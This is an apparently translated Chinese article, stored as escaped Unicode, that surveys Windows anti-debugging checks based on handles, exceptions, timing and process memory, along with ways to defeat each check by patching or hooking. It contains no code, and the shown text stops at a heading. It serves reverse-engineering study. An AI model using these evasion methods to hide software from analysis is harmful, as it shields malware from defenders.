\u4ee5\u4e0b\u4e00\u7ec4\u6280\u672f\u4ee3\u8868\u4f7f\u7528\u5185\u6838\u5bf9\u8c61\u53e5\u67c4\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728\u7684\u68c0\u67e5\u3002 \u4e00\u4e9b\u63a5\u53d7\u5185\u6838\u5bf9\u8c61\u53e5\u67c4\u4f5c\u4e3a\u53c2\u6570\u7684 WinAPI \u51fd\u6570\u5728\u8c03\u8bd5\u65f6\u53ef\u80fd\u4f1a\u8868\u73b0\u4e0d\u540c\uff0c\u6216\u8005\u4f1a\u56e0\u8c03\u8bd5\u5668\u7684\u5b9e\u73b0\u800c\u4ea7\u751f\u526f\u4f5c\u7528\u3002 \u6b64\u5916\uff0c\u5f53\u8c03\u8bd5\u5f00\u59cb\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u521b\u5efa\u7279\u5b9a\u7684\u5185\u6838\u5bf9\u8c61\u3002 OpenProcess \u53ef\u4ee5\u901a\u8fc7\u5728 csrss.exe \u8fdb\u7a0b\u4e0a\u4f7f\u7528 kernel32!OpenProcess() \u51fd\u6570\u6765\u68c0\u6d4b\u67d0\u4e9b\u8c03\u8bd5\u5668\u3002 \u4ec5\u5f53\u8fdb\u7a0b\u7684\u7528\u6237\u662f\u7ba1\u7406\u5458\u7ec4\u7684\u6210\u5458\u5e76\u4e14\u5177\u6709\u8c03\u8bd5\u6743\u9650\u65f6\uff0c\u8c03\u7528\u624d\u4f1a\u6210\u529f\u3002 CreateFile \u5f53 CREATE_PROCESS_DEBUG_EVENT \u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u88ab\u8c03\u8bd5\u6587\u4ef6\u7684\u53e5\u67c4\u5b58\u50a8\u5728 CREATE_PROCESS_DEBUG_INFO \u7ed3\u6784\u4e2d\u3002 \u56e0\u6b64\uff0c\u8c03\u8bd5\u5668\u53ef\u4ee5\u4ece\u6b64\u6587\u4ef6\u4e2d\u8bfb\u53d6\u8c03\u8bd5\u4fe1\u606f\u3002 \u5982\u679c\u8c03\u8bd5\u5668\u672a\u5173\u95ed\u6b64\u53e5\u67c4\uff0c\u5219\u4e0d\u4f1a\u4ee5\u72ec\u5360\u8bbf\u95ee\u65b9\u5f0f\u6253\u5f00\u8be5\u6587\u4ef6\u3002 \u6709\u4e9b\u8c03\u8bd5\u5668\u53ef\u80fd\u4f1a\u5fd8\u8bb0\u5173\u95ed\u53e5\u67c4\u3002 \u8fd9\u4e2a\u6280\u5de7\u4f7f\u7528 kernel32!CreateFileW() \u6216 kernel32!CreateFileA() \u4ee5\u72ec\u5360\u65b9\u5f0f\u6253\u5f00\u5f53\u524d\u8fdb\u7a0b\u7684\u6587\u4ef6\u3002 \u5982\u679c\u8c03\u7528\u5931\u8d25\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u5f53\u524d\u8fdb\u7a0b\u6b63\u5728\u8c03\u8bd5\u5668\u7684\u5b58\u5728\u4e0b\u8fd0\u884c\u3002 CloseHandle \u5982\u679c\u8fdb\u7a0b\u5728\u8c03\u8bd5\u5668\u4e0b\u8fd0\u884c\uff0c\u5e76\u4e14\u5c06\u65e0\u6548\u53e5\u67c4\u4f20\u9012\u7ed9 ntdll!NtClose() \u6216 kernel32!CloseHandle() \u51fd\u6570\uff0c\u5219\u4f1a\u5f15\u53d1 EXCEPTION_INVALID_HANDLE (0xC0000008) \u5f02\u5e38\u3002 \u5f02\u5e38\u4f1a\u7531\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7f13\u5b58\u3002 \u5982\u679c\u63a7\u5236\u6743\u88ab\u4f20\u9012\u7ed9\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u5219\u8868\u660e\u5b58\u5728\u8c03\u8bd5\u5668\u3002 LoadLibrary \u5f53\u4f7f\u7528 kernel32!LoadLibraryW() \u6216 kernel32!LoadLibraryA() \u51fd\u6570\u5c06\u6587\u4ef6\u52a0\u8f7d\u5230\u8fdb\u7a0b\u5185\u5b58\u65f6\uff0c\u4f1a\u53d1\u751f LOAD_DLL_DEBUG_EVENT \u4e8b\u4ef6\u3002 \u52a0\u8f7d\u6587\u4ef6\u7684\u53e5\u67c4\u5c06\u5b58\u50a8\u5728 LOAD_DLL_DEBUG_INFO \u7ed3\u6784\u4e2d\u3002 \u56e0\u6b64\uff0c\u8c03\u8bd5\u5668\u53ef\u4ee5\u4ece\u6b64\u6587\u4ef6\u4e2d\u8bfb\u53d6\u8c03\u8bd5\u4fe1\u606f\u3002 \u5982\u679c\u8c03\u8bd5\u5668\u672a\u5173\u95ed\u6b64\u53e5\u67c4\uff0c\u5219\u4e0d\u4f1a\u4ee5\u72ec\u5360\u8bbf\u95ee\u65b9\u5f0f\u6253\u5f00\u8be5\u6587\u4ef6\u3002 \u6709\u4e9b\u8c03\u8bd5\u5668\u53ef\u80fd\u4f1a\u5fd8\u8bb0\u5173\u95ed\u53e5\u67c4\u3002 \u8981\u68c0\u67e5\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 kernel32!LoadLibraryA() \u52a0\u8f7d\u4efb\u4f55\u6587\u4ef6\uff0c\u5e76\u5c1d\u8bd5\u4f7f\u7528 kernel32!CreateFileA() \u4ee5\u72ec\u5360\u65b9\u5f0f\u6253\u5f00\u5b83\u3002 \u5982\u679c kernel32!CreateFileA() \u8c03\u7528\u5931\u8d25\uff0c\u5219\u8868\u660e\u8c03\u8bd5\u5668\u5b58\u5728\u3002 NtQueryObject \u5f53\u8c03\u8bd5\u4f1a\u8bdd\u5f00\u59cb\u65f6\uff0c\u4f1a\u521b\u5efa\u4e00\u4e2a\u79f0\u4e3a\u201c\u8c03\u8bd5\u5bf9\u8c61\u201d\u7684\u5185\u6838\u5bf9\u8c61\uff0c\u5e76\u4e0e\u5176\u5173\u8054\u4e00\u4e2a\u53e5\u67c4\u3002 \u4f7f\u7528 ntdll!NtQueryObject() \u51fd\u6570\uff0c\u53ef\u4ee5\u67e5\u8be2\u73b0\u6709\u5bf9\u8c61\u7684\u5217\u8868\uff0c\u5e76\u68c0\u67e5\u4e0e\u4efb\u4f55\u5b58\u5728\u7684\u8c03\u8bd5\u5bf9\u8c61\u5173\u8054\u7684\u53e5\u67c4\u6570\u3002 \u7136\u800c\uff0c\u8fd9\u79cd\u6280\u672f\u65e0\u6cd5\u786e\u5b9a\u5f53\u524d\u8fdb\u7a0b\u662f\u5426\u6b63\u5728\u88ab\u8c03\u8bd5\u3002 \u5b83\u4ec5\u663e\u793a\u81ea\u7cfb\u7edf\u542f\u52a8\u4ee5\u6765\u8c03\u8bd5\u5668\u662f\u5426\u5728\u7cfb\u7edf\u4e0a\u8fd0\u884c\u3002 \u7ed3\u8bba \u51cf\u8f7b\u8fd9\u4e9b\u68c0\u67e5\u7684\u6700\u7b80\u5355\u65b9\u6cd5\u662f\u624b\u52a8\u8ddf\u8e2a\u7a0b\u5e8f\u76f4\u5230\u68c0\u67e5\u7136\u540e\u8df3\u8fc7\u5b83\uff08\u4f8b\u5982\u4f7f\u7528 NOP \u4fee\u8865\u6216\u66f4\u6539\u6307\u4ee4\u6307\u9488\u6216\u5728\u68c0\u67e5\u540e\u66f4\u6539\u96f6\u6807\u5fd7\uff09\u3002 \u5982\u679c\u60a8\u7f16\u5199\u53cd\u53cd\u8c03\u8bd5\u89e3\u51b3\u65b9\u6848\uff0c\u5219\u9700\u8981\u6302\u94a9\u5217\u51fa\u7684\u51fd\u6570\u5e76\u5728\u5206\u6790\u5176\u8f93\u5165\u540e\u66f4\u6539\u8fd4\u56de\u503c\uff1a ntdll!OpenProcess\uff1a\u5982\u679c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f csrss.exe \u7684\u53e5\u67c4\uff0c\u5219\u8fd4\u56de NULL\u3002 ntdll!NtClose\uff1a\u60a8\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u53ef\u4ee5\u4f7f\u7528 ntdll!NtQueryObject() \u68c0\u7d22\u6709\u5173\u8f93\u5165\u53e5\u67c4\u7684\u4efb\u4f55\u4fe1\u606f\uff0c\u5e76\u4e14\u5982\u679c\u53e5\u67c4\u65e0\u6548\uff0c\u5219\u4e0d\u4f1a\u5f15\u53d1\u5f02\u5e38\u3002 ntdll!NtQueryObject\uff1a\u5982\u679c\u67e5\u8be2\u4e86 ObjectAllTypesInformation \u7c7b\uff0c\u5219\u4ece\u7ed3\u679c\u4e2d\u8fc7\u6ee4\u8c03\u8bd5\u5bf9\u8c61\u3002 \u4ee5\u4e0b\u6280\u672f\u5e94\u8be5\u5728\u6ca1\u6709\u94a9\u5b50\u7684\u60c5\u51b5\u4e0b\u5904\u7406\uff1a ntdll!NtCreateFile\uff1a\u592a\u901a\u7528\uff0c\u65e0\u6cd5\u7f13\u89e3\u3002 \u4f46\u662f\uff0c\u5982\u679c\u60a8\u4e3a\u7279\u5b9a\u8c03\u8bd5\u5668\u7f16\u5199\u63d2\u4ef6\uff0c\u5219\u53ef\u4ee5\u786e\u4fdd\u88ab\u8c03\u8bd5\u6587\u4ef6\u7684\u53e5\u67c4\u88ab\u5173\u95ed\u3002 kernel32!LoadLibraryW/A\uff1a\u65e0\u53cd\u53cd\u8c03\u8bd5\u63aa\u65bd\u3002 \u5f02\u5e38 \u4ee5\u4e0b\u65b9\u6cd5\u6545\u610f\u5f15\u53d1\u5f02\u5e38\uff0c\u4ee5\u9a8c\u8bc1\u8fdb\u4e00\u6b65\u7684\u884c\u4e3a\u5bf9\u4e8e\u6ca1\u6709\u8c03\u8bd5\u5668\u8fd0\u884c\u7684\u8fdb\u7a0b\u662f\u5426\u4e0d\u662f\u5178\u578b\u7684\u3002 UnhandledExceptionFilter \u5982\u679c\u53d1\u751f\u5f02\u5e38\u5e76\u4e14\u6ca1\u6709\u6ce8\u518c\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff08\u6216\u8005\u6ce8\u518c\u4e86\u4f46\u6ca1\u6709\u5904\u7406\u6b64\u7c7b\u5f02\u5e38\uff09\uff0c\u5219\u4f1a\u8c03\u7528 kernel32!UnhandledExceptionFilter() \u51fd\u6570\u3002 \u53ef\u4ee5\u4f7f\u7528 kernel32!SetUnhandledExceptionFilter() \u6ce8\u518c\u81ea\u5b9a\u4e49\u672a\u5904\u7406\u5f02\u5e38\u8fc7\u6ee4\u5668\u3002 \u4f46\u5982\u679c\u7a0b\u5e8f\u5728\u8c03\u8bd5\u5668\u4e0b\u8fd0\u884c\uff0c\u5219\u4e0d\u4f1a\u8c03\u7528\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u5668\uff0c\u5e76\u4e14\u5f02\u5e38\u5c06\u4f20\u9012\u7ed9\u8c03\u8bd5\u5668\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u6ce8\u518c\u4e86\u672a\u5904\u7406\u7684\u5f02\u5e38\u8fc7\u6ee4\u5668\u5e76\u5c06\u63a7\u5236\u6743\u4f20\u9012\u7ed9\u5b83\uff0c\u5219\u8be5\u8fdb\u7a0b\u4e0d\u4f1a\u4f7f\u7528\u8c03\u8bd5\u5668\u8fd0\u884c\u3002 RaiseException DBC_CONTROL_C \u6216 DBG_RIPEVENT \u7b49\u5f02\u5e38\u4e0d\u4f1a\u4f20\u9012\u5230\u5f53\u524d\u8fdb\u7a0b\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u800c\u662f\u7531\u8c03\u8bd5\u5668\u4f7f\u7528\u3002 \u8fd9\u8ba9\u6211\u4eec\u53ef\u4ee5\u6ce8\u518c\u4e00\u4e2a\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u4f7f\u7528 kernel32!RaiseException() \u51fd\u6570\u5f15\u53d1\u8fd9\u4e9b\u5f02\u5e38\uff0c\u5e76\u68c0\u67e5\u63a7\u5236\u662f\u5426\u4f20\u9012\u7ed9\u6211\u4eec\u7684\u5904\u7406\u7a0b\u5e8f\u3002 \u5982\u679c\u672a\u8c03\u7528\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u5219\u8fdb\u7a0b\u53ef\u80fd\u6b63\u5728\u8c03\u8bd5\u4e2d\u3002 \u4f7f\u7528\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u9690\u85cf\u63a7\u5236\u6d41 \u8fd9\u79cd\u65b9\u6cd5\u4e0d\u4f1a\u68c0\u67e5\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728\uff0c\u4f46\u6709\u52a9\u4e8e\u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5e8f\u5217\u4e2d\u9690\u85cf\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\u3002 \u6211\u4eec\u53ef\u4ee5\u6ce8\u518c\u4e00\u4e2a\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff08\u7ed3\u6784\u5316\u6216\u5411\u91cf\u5316\uff09\uff0c\u5b83\u5f15\u53d1\u53e6\u4e00\u4e2a\u5f02\u5e38\uff0c\u8be5\u5f02\u5e38\u88ab\u4f20\u9012\u5230\u4e0b\u4e00\u4e2a\u5f15\u53d1\u4e0b\u4e00\u4e2a\u5f02\u5e38\u7684\u5904\u7406\u7a0b\u5e8f\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002 \u6700\u540e\uff0c\u5904\u7406\u7a0b\u5e8f\u7684\u5e8f\u5217\u5e94\u8be5\u6307\u5411\u6211\u4eec\u60f3\u8981\u9690\u85cf\u7684\u8fc7\u7a0b\u3002 \u7ed3\u8bba \u5bf9\u4e8eUnhandledExceptionFilter\uff0c\u53ea\u9700\u7528 NOP \u586b\u5145\u76f8\u5e94\u7684\u68c0\u67e5\u5373\u53ef\u3002 \u5bf9\u4e8e\u9690\u85cf\u63a7\u5236\u6d41\uff0c\u5fc5\u987b\u624b\u52a8\u8ddf\u8e2a\u7a0b\u5e8f\u76f4\u5230\u6709\u6548\u8d1f\u8f7d\u3002 \u5bf9\u4e8eRaiseException\uff0c\u6b64\u7c7b\u6280\u672f\u7684\u95ee\u9898\u662f\u4e0d\u540c\u7684\u8c03\u8bd5\u5668\u4f1a\u6d88\u8017\u4e0d\u540c\u7684\u5f02\u5e38\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5c06\u5b83\u4eec\u8fd4\u56de\u7ed9\u8c03\u8bd5\u5668\u3002 \u8fd9\u610f\u5473\u7740\u60a8\u5fc5\u987b\u4e3a\u7279\u5b9a\u8c03\u8bd5\u5668\u5b9e\u73b0\u4e00\u4e2a\u63d2\u4ef6\uff0c\u5e76\u66f4\u6539\u5728\u76f8\u5e94\u5f02\u5e38\u540e\u89e6\u53d1\u7684\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u7684\u884c\u4e3a\u3002 \u65f6\u673a \u5f53\u5728\u8c03\u8bd5\u5668\u4e2d\u8ddf\u8e2a\u8fdb\u7a0b\u65f6\uff0c\u6307\u4ee4\u548c\u6267\u884c\u4e4b\u95f4\u5b58\u5728\u5de8\u5927\u7684\u5ef6\u8fdf\u3002 \u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u65b9\u6cd5\u6d4b\u91cf\u4ee3\u7801\u67d0\u4e9b\u90e8\u5206\u4e4b\u95f4\u7684\u201c\u672c\u673a\u201d\u5ef6\u8fdf\uff0c\u5e76\u5c06\u5176\u4e0e\u5b9e\u9645\u5ef6\u8fdf\u8fdb\u884c\u6bd4\u8f83\u3002 RDPMC/RDTSC \u8fd9\u4e9b\u6307\u4ee4\u9700\u8981\u5728 CR4 \u5bc4\u5b58\u5668\u4e2d\u8bbe\u7f6e\u6807\u5fd7 PCE\u3002 RDPMC \u6307\u4ee4\u53ea\u80fd\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u4f7f\u7528\u3002 GetLocalTime GetSystemTime GetTickCount ZwGetTickCount() / KiGetTickCount() \u8fd9\u4e24\u4e2a\u51fd\u6570\u90fd\u53ea\u80fd\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u4f7f\u7528\u3002 \u5c31\u50cf\u7528\u6237\u6a21\u5f0f GetTickCount() \u6216 GetSystemTime() \u4e00\u6837\uff0c\u5185\u6838\u6a21\u5f0f ZwGetTickCount() \u4ece KUSER_SHARED_DATA \u9875\u8bfb\u53d6\u3002 \u8be5\u9875\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u6620\u5c04\u5230\u865a\u62df\u5730\u5740\u7684\u7528\u6237\u6a21\u5f0f\u8303\u56f4\u5185\uff0c\u5e76\u5728\u5185\u6838\u8303\u56f4\u5185\u4ee5\u8bfb\u5199\u65b9\u5f0f\u6620\u5c04\u3002 \u7cfb\u7edf\u65f6\u949f\u6ef4\u7b54\u66f4\u65b0\u7cfb\u7edf\u65f6\u95f4\uff0c\u7cfb\u7edf\u65f6\u95f4\u76f4\u63a5\u5b58\u50a8\u5728\u8be5\u9875\u9762\u4e2d\u3002 ZwGetTickCount() \u7684\u4f7f\u7528\u65b9\u5f0f\u4e0e GetTickCount() \u76f8\u540c\u3002 \u4f7f\u7528 KiGetTickCount() \u6bd4\u8c03\u7528 ZwGetTickCount() \u66f4\u5feb\uff0c\u4f46\u6bd4\u76f4\u63a5\u4ece KUSER_SHARED_DATA \u9875\u8bfb\u53d6\u7a0d\u6162\u3002 QueryPerformanceCounter timeGetTime \u7ed3\u8bba \u8c03\u8bd5\u671f\u95f4\uff1a\u53ea\u9700\u7528 NOP \u586b\u5145\u65f6\u5e8f\u68c0\u67e5\u5e76\u5c06\u8fd9\u4e9b\u68c0\u67e5\u7684\u7ed3\u679c\u8bbe\u7f6e\u4e3a\u9002\u5f53\u7684\u503c\u5373\u53ef\u3002 \u5bf9\u4e8e\u53cd\u53cd\u8c03\u8bd5\u89e3\u51b3\u65b9\u6848\u5f00\u53d1\uff1a\u6ca1\u6709\u5fc5\u8981\u5bf9\u5176\u505a\u4efb\u4f55\u4e8b\u60c5\uff0c\u56e0\u4e3a\u6240\u6709\u65f6\u5e8f\u68c0\u67e5\u90fd\u4e0d\u662f\u5f88\u53ef\u9760\u3002 \u60a8\u4ecd\u7136\u53ef\u4ee5\u6302\u94a9\u8ba1\u65f6\u529f\u80fd\u5e76\u52a0\u5feb\u8c03\u7528\u4e4b\u95f4\u7684\u65f6\u95f4\u3002 \u8fdb\u7a0b\u5185\u5b58 \u8fdb\u7a0b\u53ef\u4ee5\u68c0\u67e5\u81ea\u5df1\u7684\u5185\u5b58\u4ee5\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u5b58\u5728\u6216\u5e72\u6270\u8c03\u8bd5\u5668\u3002 \u672c\u8282\u5305\u62ec\u8fdb\u7a0b\u5185\u5b58\u548c\u68c0\u67e5\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u3001\u641c\u7d22\u65ad\u70b9\u4ee5\u53ca\u4f5c\u4e3a\u53cd\u9644\u52a0\u65b9\u6cd5\u7684\u51fd\u6570\u4fee\u8865\u3002 \u65ad\u70b9 \u59cb\u7ec8\u53ef\u4ee5\u68c0\u67e5\u8fdb\u7a0b\u5185\u5b58\u5e76\u641c\u7d22\u4ee3\u7801\u4e2d\u7684\u8f6f\u4ef6\u65ad\u70b9\uff0c\u6216\u8005\u68c0\u67e5 CPU \u8c03\u8bd5\u5bc4\u5b58\u5668\u4ee5\u786e\u5b9a\u662f\u5426\u8bbe\u7f6e\u4e86\u786c\u4ef6\u65ad\u70b9\u3002 \u8f6f\u4ef6\u65ad\u70b9(INT3) \u8fd9\u4e2a\u60f3\u6cd5\u662f\u4e3a\u4e86\u8bc6\u522b 0xCC \u5b57\u8282\uff08\u4ee3\u8868 INT 3 \u6c47\u7f16\u6307\u4ee4\uff09\u7684\u67d0\u4e9b\u51fd\u6570\u7684\u673a\u5668\u4ee3\u7801\u3002 \u6b64\u65b9\u6cd5\u53ef\u80fd\u4f1a\u4ea7\u751f\u8bb8\u591a\u8bef\u62a5\uff0c\u56e0\u6b64\u5e94\u8c28\u614e\u4f7f\u7528\u3002 \u9632\u8de8\u6b65 \u8c03\u8bd5\u5668\u5141\u8bb8\u60a8\u5355\u6b65\u6267\u884c\u51fd\u6570\u8c03\u7528\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8c03\u8bd5\u5668\u4f1a\u5728\u8c03\u7528\u4e4b\u540e\u7684\u6307\u4ee4\uff08\u5373\u88ab\u8c03\u7528\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff09\u4e0a\u9690\u5f0f\u8bbe\u7f6e\u8f6f\u4ef6\u65ad\u70b9\u3002 \u4e3a\u4e86\u68c0\u6d4b\u662f\u5426\u8bd5\u56fe\u8df3\u8fc7\u8be5\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u68c0\u67e5\u8fd4\u56de\u5730\u5740\u5904\u7684\u5185\u5b58\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u3002 \u5982\u679c\u8f6f\u4ef6\u65ad\u70b9\uff080xCC\uff09\u4f4d\u4e8e\u8fd4\u56de\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u5176\u4ed6\u6307\u4ee4\uff08\u4f8b\u5982 NOP\uff09\u5bf9\u5176\u8fdb\u884c\u4fee\u8865\u3002 \u5b83\u5f88\u53ef\u80fd\u4f1a\u7834\u574f\u4ee3\u7801\u5e76\u4f7f\u8fdb\u7a0b\u5d29\u6e83\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u4e00\u4e9b\u6709\u610f\u4e49\u7684\u4ee3\u7801\u800c\u4e0d\u662fNOP\u6765\u4fee\u8865\u8fd4\u56de\u5730\u5740\uff0c\u5e76\u66f4\u6539\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\u7a0b\u3002 \u76f4\u63a5\u4fee\u6539\u5185\u5b58 \u53ef\u4ee5\u4ece\u51fd\u6570\u5185\u90e8\u68c0\u67e5\u8c03\u7528\u8be5\u51fd\u6570\u540e\u662f\u5426\u5b58\u5728\u8f6f\u4ef6\u65ad\u70b9\u3002 \u6211\u4eec\u53ef\u4ee5\u5728\u8fd4\u56de\u5730\u5740\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u8be5\u5b57\u8282\u7b49\u4e8e0xCC\uff08INT 3\uff09\uff0c\u5219\u53ef\u4ee5\u75280x90\uff08NOP\uff09\u91cd\u5199\u5b83\u3002 \u8be5\u8fdb\u7a0b\u53ef\u80fd\u4f1a\u5d29\u6e83\uff0c\u56e0\u4e3a\u6211\u4eec\u635f\u574f\u4e86\u8fd4\u56de\u5730\u5740\u5904\u7684\u6307\u4ee4\u3002 \u4f46\u662f\uff0c\u5982\u679c\u60a8\u77e5\u9053\u51fd\u6570\u8c03\u7528\u540e\u9762\u662f\u54ea\u6761\u6307\u4ee4\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u8be5\u6307\u4ee4\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u91cd\u5199\u65ad\u70b9\u3002 ReadFile \u8be5\u65b9\u6cd5\u4f7f\u7528 kernel32!ReadFile() \u51fd\u6570\u6765\u4fee\u8865\u8fd4\u56de\u5730\u5740\u5904\u7684\u4ee3\u7801\u3002 \u8fd9\u4e2a\u60f3\u6cd5\u662f\u8bfb\u53d6\u5f53\u524d\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5e76\u5c06\u8fd4\u56de\u5730\u5740\u4f5c\u4e3a\u8f93\u51fa\u7f13\u51b2\u533a\u4f20\u9012\u7ed9 kernel32!ReadFile() \u3002 \u8fd4\u56de\u5730\u5740\u5904\u7684\u5b57\u8282\u5c06\u7528\u201cM\u201d\u5b57\u7b26\uff08PE \u6620\u50cf\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\uff09\u8fdb\u884c\u4fee\u8865\uff0c\u5e76\u4e14\u8fdb\u7a0b\u53ef\u80fd\u4f1a\u5d29\u6e83\u3002 WriteProcessMemory \u6b64\u65b9\u6cd5\u4f7f\u7528 `kernel32!WriteProcessMemory() \u51fd\u6570\u6765\u4fee\u8865\u8fd4\u56de\u5730\u5740\u5904\u7684\u4ee3\u7801\u3002 Toolhelp32ReadProcessMemory \u51fd\u6570 kernel32!Toolhelp32ReadProcessMemory() \u5141\u8bb8\u60a8\u8bfb\u53d6\u5176\u4ed6\u8fdb\u7a0b\u7684\u5185\u5b58\u3002 \u7136\u800c\uff0c\u5b83\u53ef\u7528\u4e8e\u9632\u8de8\u6b65\u6761\u4ef6\u68c0\u67e5\u3002 \u5185\u5b58\u65ad\u70b9 \u5185\u5b58\u65ad\u70b9\u662f\u901a\u8fc7\u4f7f\u7528\u4fdd\u62a4\u9875\u6765\u5b9e\u73b0\u7684\uff08\u81f3\u5c11\u5728 OllyDbg \u548c ImmunityDebugger \u4e2d\u5982\u6b64\uff09\u3002 \u4fdd\u62a4\u9875\u4e3a\u5185\u5b58\u9875\u8bbf\u95ee\u63d0\u4f9b\u4e00\u6b21\u6027\u8b66\u62a5\u3002 \u6267\u884c\u4fdd\u62a4\u9875\u65f6\uff0c\u4f1a\u5f15\u53d1\u5f02\u5e38 STATUS_GUARD_PAGE_VIOLATION \u3002 \u53ef\u4ee5\u901a\u8fc7\u5728 kernel32!VirtualAlloc() \u3001 kernel32!VirtualAllocEx() \u3001 kernel32!VirtualProtect() \u548c kernel32!VirtualProtectEx() \u51fd\u6570\u4e2d\u8bbe\u7f6e PAGE_GUARD \u9875\u9762\u4fdd\u62a4\u4fee\u9970\u7b26\u6765\u521b\u5efa\u4fdd\u62a4\u9875\u3002 \u7136\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6ee5\u7528\u8c03\u8bd5\u5668\u5b9e\u73b0\u5185\u5b58\u65ad\u70b9\u7684\u65b9\u5f0f\u6765\u68c0\u67e5\u7a0b\u5e8f\u662f\u5426\u5728\u8c03\u8bd5\u5668\u4e0b\u6267\u884c\u3002 \u6211\u4eec\u53ef\u4ee5\u5206\u914d\u4e00\u4e2a\u53ef\u6267\u884c\u7f13\u51b2\u533a\uff0c\u5176\u4e2d\u4ec5\u5305\u542b\u4e00\u4e2a\u5b57\u8282 0xC3 \uff0c\u5b83\u4ee3\u8868 RET \u6307\u4ee4\u3002 \u7136\u540e\uff0c\u6211\u4eec\u5c06\u6b64\u7f13\u51b2\u533a\u6807\u8bb0\u4e3a\u4fdd\u62a4\u9875\uff0c\u5c06\u5904\u7406\u8c03\u8bd5\u5668\u5b58\u5728\u60c5\u51b5\u7684\u5730\u5740\u63a8\u9001\u5230\u5806\u6808\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u5206\u914d\u7684\u7f13\u51b2\u533a\u3002 \u6307\u4ee4 RET \u5c06\u88ab\u6267\u884c\uff0c\u5982\u679c\u8c03\u8bd5\u5668\uff08OllyDbg \u6216 ImmunityDebugger\uff09\u5b58\u5728\uff0c\u6211\u4eec\u5c06\u5230\u8fbe\u6211\u4eec\u63a8\u9001\u5230\u5806\u6808\u7684\u5730\u5740\u3002 \u5982\u679c\u7a0b\u5e8f\u5728\u6ca1\u6709\u8c03\u8bd5\u5668\u7684\u60c5\u51b5\u4e0b\u6267\u884c\uff0c\u6211\u4eec\u5c06\u8fdb\u5165\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 \u786c\u4ef6\u65ad\u70b9 \u8c03\u8bd5\u5bc4\u5b58\u5668 DR0\u3001DR1\u3001DR2 \u548c DR3 \u53ef\u4ee5\u4ece\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u68c0\u7d22\u3002 \u5982\u679c\u5b83\u4eec\u5305\u542b\u975e\u96f6\u503c\uff0c\u5219\u53ef\u80fd\u610f\u5473\u7740\u8be5\u8fdb\u7a0b\u662f\u5728\u8c03\u8bd5\u5668\u4e0b\u6267\u884c\u7684\u5e76\u4e14\u8bbe\u7f6e\u4e86\u786c\u4ef6\u65ad\u70b9\u3002 \u5185\u5b58\u68c0\u67e5\u5176\u4ed6\u65b9\u5f0f \u672c\u8282\u5305\u542b\u76f4\u63a5\u68c0\u67e5\u6216\u64cd\u4f5c\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u4ee5\u68c0\u6d4b\u6216\u963b\u6b62\u8c03\u8bd5\u7684\u6280\u672f\u3002 NtQueryVirtualMemory \u4ee3\u7801\u6240\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u9875\u5728\u6240\u6709\u8fdb\u7a0b\u4e4b\u95f4\u5171\u4eab\uff0c\u76f4\u5230\u5199\u5165\u4e00\u4e2a\u9875\u3002 \u4e4b\u540e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u590d\u5236\u8be5\u9875\u9762\u5e76\u5c06\u5176\u6620\u5c04\u5230\u8fdb\u7a0b\u865a\u62df\u5185\u5b58\uff0c\u56e0\u6b64\u8be5\u9875\u9762\u4e0d\u518d\u201c\u5171\u4eab\u201d\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u67e5\u8be2\u5f53\u524d\u8fdb\u7a0b\u7684Working Set\uff0c\u67e5\u770b\u5e26\u6709\u4ee3\u7801\u7684\u9875\u9762\u7684Working Set Block\u7684Shared\u548cShareCount\u5b57\u6bb5\u3002 \u5982\u679c\u4ee3\u7801\u4e2d\u6709\u8f6f\u4ef6\u65ad\u70b9\uff0c\u5219\u4e0d\u5f97\u8bbe\u7f6e\u8fd9\u4e9b\u5b57\u6bb5\u3002 Detecting a function 